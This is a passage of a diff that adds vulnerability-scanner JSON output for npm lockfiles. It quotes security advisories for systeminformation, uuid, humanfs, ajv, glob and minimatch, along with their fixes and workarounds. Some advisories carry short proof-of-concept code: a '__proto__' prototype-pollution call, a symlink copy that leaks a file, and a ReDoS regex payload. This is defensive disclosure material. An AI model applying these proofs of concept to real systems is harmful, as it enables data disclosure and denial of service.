\u003c-- unchanged\n\"constructor\" -\u003e \"constructor\"   \u003c-- unchanged\n```\n\nThe sanitizer is doing its job; the gap is that no layer treats the value as an *object key*.\n\n### Reachability\n\nThe cache write is guarded incidentally on three of four platform branches. These guards exist\nfor unrelated reasons and are not a deliberate defence:\n\n| Platform | Code path | Reachable with an arbitrary name? |\n| --- | --- | --- |\n| Linux / Android | `fs.existsSync('/sys/class/net/' + ifaceSanitized)` | **No** — a non-existent interface returns early |\n| macOS | requires `netstat` to emit a data row beyond the header | **No** — verified on macOS 27, `Object.prototype` stays clean |\n| Windows | `if (rx_bytes \u0026\u0026 tx_bytes)` — requires a real adapter match | **No** |\n| **FreeBSD / OpenBSD / NetBSD** | `if (!error) { …; result = calcNetworkSpeed(ifaceSanitized, …) }` | **Yes** — the call sits outside the parsing loop, so any successful `netstat` exit reaches it, and `netstat -ibndI \u003cunknown\u003e` prints only its header and exits `0` |\n\nThe important part is not that three platforms happen to be safe, but that nothing in the\ndesign prevents the write. Any future platform branch without such a guard reopens the issue,\nwhich is why the fix is applied at the cache rather than at the call sites.\n\n### Age\n\nThe pattern predates the v5 line — `git log -S \"_network[iface] = {}\"` traces it back to a\nrefactoring before `v3.42.5`. The v3 and v4 lines are end of life; the advisory covers v5.\n\n## Impact\n\nThe attacker controls which attributes appear on `Object.prototype` but not their values —\nthose come from the interface statistics (`rx_bytes`, `ms`, `operstate` …). The attribute\n*names* are fixed by the library, so this is not an arbitrary-key pollution primitive.\n\nThe consequences are therefore application specific and arise from name collisions:\n\n- Any application code that tests `if (obj.operstate)`, `if (obj.ms)` or similar on an object\n  that should not have those properties now takes the wrong branch.\n- `for…in` loops over plain objects gain seven extra enumerable keys, which can corrupt\n  serialisation, configuration merging or validation logic.\n- Libraries that use `{}` as a lookup map and check membership with `in` or truthiness can\n  return values for keys that were never inserted.\n\nNo path to remote code execution is known, and the values cannot be chosen by the attacker.\n\n## Proof of concept\n\n### The underlying primitive (any platform)\n\n```js\nconst { calcNetworkSpeed } = require('systeminformation/lib/network.js'); // internal\nconst cache = {};                       // the declaration used by the library\ncalcNetworkSpeed('__proto__', 1, 2, 'up', 0, 0, 0, 0);\n\nconsole.log({}.rx_bytes);               // 1\nconsole.log({}.operstate);              // 'up'\nconsole.log(Object.prototype.hasOwnProperty('rx_bytes')); // true\n```\n\n### End to end through the public API (FreeBSD / OpenBSD / NetBSD)\n\n```js\nconst si = require('systeminformation');\n\n(async () =\u003e {\n  console.log('before:', {}.operstate);   // undefined\n  await si.networkStats('__proto__');     // an attacker supplied interface name\n  console.log('after :', {}.operstate);   // 'up'  -\u003e Object.prototype is polluted\n})();\n```\n\nOn Linux, macOS and Windows the same call returns an empty result set and leaves\n`Object.prototype` untouched, for the reasons in the *Reachability* table.\n\n## Patch\n\n`lib/network.js` — give the cache a null prototype, so `__proto__` becomes an ordinary own\nproperty instead of a setter into the prototype chain:\n\n```diff\n-const _network = {};\n+const _network = Object.create(null);\n```\n\nThis is the smallest change that fixes the class of problem rather than one reachable path:\n\n- It is independent of the platform branches, so no guard has to be added or maintained.\n- It keeps behaviour identical for every legitimate interface name — `Object.keys()`,\n  member reads and writes all work unchanged on a null prototype object.\n- It matches the pattern already used elsewhere in the codebase\n  (`lib/filesystem.js:114-115`, `lib/graphics.js:1060`, `lib/graphics.js:1087`).\n- `Object.create` is ES5.1, well below the declared `engines.node \u003e= 10.0.0`.\n\nAfter the patch the hostile name is stored as a normal cache entry:\n\n```js\nconst cache = Object.create(null);\n// ... cache['__proto__'] holds the stats object, Object.prototype is untouched\n```\n\n## Workarounds\n\nFor users who cannot upgrade immediately, either of these is sufficient:\n\n1. **Validate the interface name before calling** — accept only names returned by\n   `si.networkInterfaces()`, or reject the names `__proto__`, `constructor` and `prototype`.\n2. **Never pass untrusted input** as the `ifaces` argument. Passing `'*'` or omitting the\n   argument is unaffected, because those names come from the system rather than the caller.\n\nFreezing `Object.prototype` (`Object.freeze(Object.prototype)`) also prevents the write, but it\nhas wide-reaching side effects on other dependencies and is not recommended as a general\nmitigation.\n\n## Affected versions\n\nAll `5.x` releases up to and including `5.33.12`. Earlier major lines contain the same pattern\nbut are end of life.\n\n### What was verified, and what was not\n\nVerified on this machine (macOS 27, Node 24):\n\n- the pollution primitive, by calling the cache write with `iface = '__proto__'`;\n- that `util.sanitizeString('__proto__', true)` returns the string unchanged, while shell\n  metacharacters are stripped;\n- that unpatched v5 on macOS does **not** pollute through the public API;\n- that `netstat -bdnI \u003cunknown-interface\u003e` prints only its header and exits `0`;\n- that the patch stores the hostile key as an own property and leaves `Object.prototype` clean.\n\nNot verified, because no such host was available:\n\n- end to end exploitation on FreeBSD, OpenBSD or NetBSD. That conclusion is derived from\n  reading the BSD branch of `networkStatsSingle()` — where the `calcNetworkSpeed()` call sits\n  outside the row parsing loop and is reached whenever `netstat` exits successfully — combined\n  with the observed `netstat` exit behaviour above. Worth confirming on a BSD host before\n  publishing, since the affected-platform list depends on it.",
+              "id": "GHSA-7648-jmwf-vw7j",
+              "modified": "2026-10-28T21:30:05.739266214Z",
+              "published": "2026-10-28T21:13:32Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-7648-jmwf-vw7j"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-116674"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/sebhildebrandt/systeminformation/commit/6ff25a1ebc0b1fdc7a8aa3507e46f22007da2969"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/sebhildebrandt/systeminformation"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.33.13"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:L",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "systeminformation has prototype pollution in `networkStats()` via the interface name"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "uuid",
+            "version": "8.3.2",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/uuid@8.3.2?source=PUBLIC_REGISTRY"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-w5hq-g745-h8pq"
+              ],
+              "aliases": [
+                "CVE-2026-41907",
+                "CVE-2026-41988",
+                "GHSA-w5hq-g745-h8pq"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5hq-g745-h8pq/GHSA-w5hq-g745-h8pq.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "uuid",
+                    "purl": "pkg:npm/uuid"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "11.1.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5hq-g745-h8pq/GHSA-w5hq-g745-h8pq.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "uuid",
+                    "purl": "pkg:npm/uuid"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "12.0.0"
+                        },
+                        {
+                          "fixed": "12.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5hq-g745-h8pq/GHSA-w5hq-g745-h8pq.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "uuid",
+                    "purl": "pkg:npm/uuid"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "13.0.0"
+                        },
+                        {
+                          "fixed": "13.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-41907",
+                "CVE-2026-41988"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1285",
+                  "CWE-787"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-04-22T20:53:24Z",
+                "nvd_published_at": "2026-04-24T19:17:14Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=\u003ev4({},new Uint8Array(8),4)],\n  ['v5()',()=\u003ev5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=\u003ev6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset \u003c 0 || offset + 16 \u003e buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+              "id": "GHSA-w5hq-g745-h8pq",
+              "modified": "2026-09-10T03:51:03.663336650Z",
+              "published": "2026-04-22T20:53:24Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41907"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/uuidjs/uuid"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v11.1.1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v12.0.1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v13.0.1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v14.0.0"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "source": {
+        "path": "C:/Users/jayan/OneDrive/Desktop/Software-Supply-Chain-Guardian_Team-31-main/Software-Supply-Chain-Guardian_Team-31-main/data/scans/OWASP__wrongsecrets__20261124-054904/repo/src/test/e2e/package-lock.json",
+        "type": "lockfile"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "@humanfs/node",
+            "version": "0.16.6",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/%40humanfs/node@0.16.6?source=PUBLIC_REGISTRY"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-p498-v437-472g"
+              ],
+              "aliases": [
+                "GHSA-p498-v437-472g"
+              ],
+              "max_severity": "5.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-p498-v437-472g/GHSA-p498-v437-472g.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@humanfs/node",
+                    "purl": "pkg:npm/%40humanfs/node"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.16.8"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T14:27:16Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`@humanfs/node` does not treat symlinks as a separate case during copy operations. A symlink placed inside an attacker-controlled source tree can make `copyAll()` read and copy the contents of any file readable by the process, even when that file is outside the directory being copied.\n\n### Details\n\nThe Node implementation exposes symlink state through `list()`, but `copyAll()` ignores it. During recursive copies, every non-directory entry is passed to `copy()`, which delegates to `fs.promises.copyFile()`.\n\nOn Node, `copyFile()` dereferences symlinks. As a result, a symlink inside the copied tree is handled as if it were an ordinary file, and the destination receives the contents of the symlink target rather than a copy of the link itself.\n\nThat breaks the expected boundary of a directory copy. A caller can point `copyAll()` at a seemingly self-contained directory and still end up copying data from elsewhere on the host filesystem if the source tree contains attacker-supplied symlinks.\n\nThe same dereference behavior also affects `copy()` when the source path itself is a symlink.\n\n### PoC\n\n```js\nimport { NodeHfs } from \"@humanfs/node\";\nimport fs from \"node:fs/promises\";\nimport path from \"node:path\";\nimport os from \"node:os\";\n\nconst root = await fs.mkdtemp(path.join(os.tmpdir(), \"humanfs-\"));\nconst src = path.join(root, \"src\");\nconst dst = path.join(root, \"dst\");\nconst secret = path.join(root, \"secret.txt\");\n\nawait fs.mkdir(src);\nawait fs.writeFile(secret, \"TOPSECRET\");\nawait fs.symlink(secret, path.join(src, \"link.txt\"));\n\nconst hfs = new NodeHfs();\nawait hfs.copyAll(src, dst);\n\nconsole.log(await fs.readFile(path.join(dst, \"link.txt\"), \"utf8\"));\n// TOPSECRET\n```\n\n### Impact\n\nIf an application uses `copyAll()` or `copy()` on attacker-controlled paths, a symlink can be used to pull arbitrary readable host files into the copied output. In practice, that can turn a normal workspace copy, export, or packaging step into a file disclosure primitive.",
+              "id": "GHSA-p498-v437-472g",
+              "modified": "2026-09-10T03:50:54.516902811Z",
+              "published": "2026-09-02T14:27:16Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/humanwhocodes/humanfs/security/advisories/GHSA-p498-v437-472g"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/humanwhocodes/humanfs/commit/22bbaa4487a3e6c1197ca619840de4615d0c3404"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/humanwhocodes/humanfs"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/humanwhocodes/humanfs/releases/tag/node-v0.16.8"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "humanfs: Recursive copy follows symlinked files and copies data from outside the source tree"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "ajv",
+            "version": "6.12.6",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/ajv@6.12.6?source=PUBLIC_REGISTRY"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-2g4f-4pwh-qvx6"
+              ],
+              "aliases": [
+                "CVE-2025-69873",
+                "GHSA-2g4f-4pwh-qvx6"
+              ],
+              "max_severity": "5.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-2g4f-4pwh-qvx6/GHSA-2g4f-4pwh-qvx6.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "ajv",
+                    "purl": "pkg:npm/ajv"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "7.0.0-alpha.0"
+                        },
+                        {
+                          "fixed": "8.18.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-2g4f-4pwh-qvx6/GHSA-2g4f-4pwh-qvx6.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "ajv",
+                    "purl": "pkg:npm/ajv"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "6.14.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-69873"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333",
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-02-17T16:38:57Z",
+                "nvd_published_at": "2026-02-11T19:15:50Z",
+                "severity": "MODERATE"
+              },
+              "details": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+              "id": "GHSA-2g4f-4pwh-qvx6",
+              "modified": "2026-09-10T03:50:33.716487588Z",
+              "published": "2026-02-11T21:30:39Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-69873"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/pull/2586"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/pull/2588"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/pull/2590"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/github/advisory-database/pull/6991"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/commit/720a23fa453ffae8340e92c9b0fe886c54cfe0d5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69873-ajv-ReDoS.md"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/advisories/GHSA-2g4f-4pwh-qvx6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/ajv-validator/ajv"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/releases/tag/v6.14.0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/releases/tag/v8.18.0"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "ajv has ReDoS when using `$data` option"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "glob",
+            "version": "13.0.6",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/glob@13.0.6?source=PUBLIC_REGISTRY"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-3g3m-2fjr-6pw4"
+              ],
+              "aliases": [
+                "CVE-2026-118773",
+                "GHSA-3g3m-2fjr-6pw4"
+              ],
+              "max_severity": "6.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 14.0.1",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-3g3m-2fjr-6pw4/GHSA-3g3m-2fjr-6pw4.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "glob",
+                    "purl": "pkg:npm/glob"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "9.0.0"
+                        },
+                        {
+                          "fixed": "14.0.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-118773"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-30T23:09:11Z",
+                "nvd_published_at": "2026-10-29T19:17:19Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\nIn glob 13.0.6, an aborted async walk rejects or emits an error but continues recursively reading directories in the background.\n\nThe root cause is that abort branches in src/walker.ts call cb() without returning. As a result, callers that rely on signal or AbortSignal.timeout() to bound glob traversal cost can still incur filesystem I/O and CPU work after the request has already been rejected.\n\n### Details\n\nThis was reproduced on glob v13.0.6 (commit e80cb38ae60d6cbff9e75f39032a994858994d35).\n\nThe README documents that the signal option cancels the glob walk. However, in src/walker.ts, the following methods call cb() when this.signal?.aborted is true but do not return:\n\n- GlobUtil.walkCB()\n- GlobUtil.walkCB2()\n- GlobUtil.walkCBSync()\n- GlobUtil.walkCB2Sync()\n\nExample vulnerable pattern:\n\nif (this.signal?.aborted) cb()\n\nBecause execution continues after cb(), the walker still reaches processor.processPatterns(), readdirCB(), and recursive walkCB2() calls.\n\nThe issue was directly demonstrated against v13.0.6. A source-history review shows the same missing-return pattern is present in tagged releases from v9.0.0 through v13.0.6.\n\nThe issue affects both glob() and globStream().\n\nRecommended fix:\nChange each abort branch to return immediately:\n\nif (this.signal?.aborted) return cb()\n\n### Proof of concept\n\nEnvironment:\n- Linux x86_64\n- Node.js v22.23.3\n- npm 10.9.9\n- glob 13.0.6\n\nReproduction steps:\n\n1. Install the affected package:\n   npm init -y\n   npm install glob@13.0.6\n\n2. Run the attached PoC:\n   node poc/abort-continues-work.mjs\n\nThe PoC aborts after the first readdir() call, waits briefly, and counts how many more directory reads happen after the promise has already rejected.\n\nObserved output on the vulnerable version:\n\n{\n  \"rejection\": \"Error: probe-abort\",\n  \"readdirCalls\": 1365,\n  \"readdirCallsAtReject\": 5,\n  \"readdirCallsAfterReject\": 1360\n}\n\nExpected behavior:\nreaddirCallsAfterReject should be 0.\n\nA second PoC using AbortSignal.timeout() also reproduces the issue:\n\n{\n  \"rejection\": \"TimeoutError: The operation was aborted due to timeout\",\n  \"readdirCalls\": 133,\n  \"readdirCallsAtReject\": 1,\n  \"readdirCallsAfterReject\": 132\n}\n\nThe same test against a patched build with return cb() in the four abort branches stops immediately:\n\n{\n  \"readdirCalls\": 1,\n  \"readdirCallsAtReject\": 1,\n  \"readdirCallsAfterReject\": 0\n}\n\n### Impact\n\nThis is an availability issue.\n\nApplications that expose globbing over attacker-influenced patterns or attacker-controlled directory trees and use AbortSignal / AbortSignal.timeout() as a traversal budget can still perform significant filesystem I/O and CPU work after a request has already timed out or been canceled.\n\nRepeated timed-out requests can stack background glob walks and degrade worker throughput or service availability.\n\nNo confidentiality or integrity impact was observed.",
+              "id": "GHSA-3g3m-2fjr-6pw4",
+              "modified": "2026-10-30T23:15:04.503965732Z",
+              "published": "2026-10-30T23:09:11Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/security/advisories/GHSA-3g3m-2fjr-6pw4"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118773"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/commit/4682e8c9babee1b385202ede36389634e12076d7"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/node-glob"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/releases/tag/v14.0.2"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Glob: AbortSignal cancellation bypass allows post-timeout filesystem traversal"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "minimatch",
+            "version": "10.2.6",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/minimatch@10.2.6?source=PUBLIC_REGISTRY"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-g3hv-75wg-m249"
+              ],
+              "aliases": [
+                "CVE-2026-118764",
+                "GHSA-g3hv-75wg-m249"
+              ],
+              "max_severity": "6.9"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-g3hv-75wg-m249/GHSA-g3hv-75wg-m249.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "minimatch",
+                    "purl": "pkg:npm/minimatch"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "7.0.0"
+                        },
+                        {
+                          "fixed": "11.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-118764"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-405"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-30T23:09:55Z",
+                "nvd_published_at": "2026-10-29T17:18:07Z",
+                "severity": "MODERATE"
+              },
+              "details": "minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel \u003e= 2.\n\nresearcher: Reid Downing (b1nv0id)\nfiles: \n\n- src/index.ts: 690-770\n- src/index.ts: 780-796\n\nissue:\ninput-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.\n\nthe **/../ transformation clones a globparts entry and appends the clone to the same globparts array:\n```\nparts.splice(gs, 1)\nconst other = parts.slice(0)\nother[gs] = '**'\nglobParts.push(other)\n```\nthis occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.\n\nthe expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:\n```\nfor (let i = 0; i \u003c globParts.length - 1; i++) {\n  for (let j = i + 1; j \u003c globParts.length; j++) {\n    this.partsMatch(...)\n  }\n}\n```\nan attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.",
+              "id": "GHSA-g3hv-75wg-m249",
+              "modified": "2026-11-04T17:01:25.850114200Z",
+              "published": "2026-10-30T23:09:55Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/minimatch/security/advisories/GHSA-g3hv-75wg-m249"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118764"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/minimatch/commit/297b6c1a01f2410b3ba1ebed14ba222d0c3c1033"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/minimatch/commit/77a0f5c4b80bdc641c3c930a1d9edf5ad2db57f8"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/minimatch/commit/fd0b3ab9cbc5bf1aff1c99f1f46e413c2b3340da"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/minimatch"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/minimatch/releases/tag/v11.0.1"
+                }
+              ],
+              "schema_version": "1.9.2",
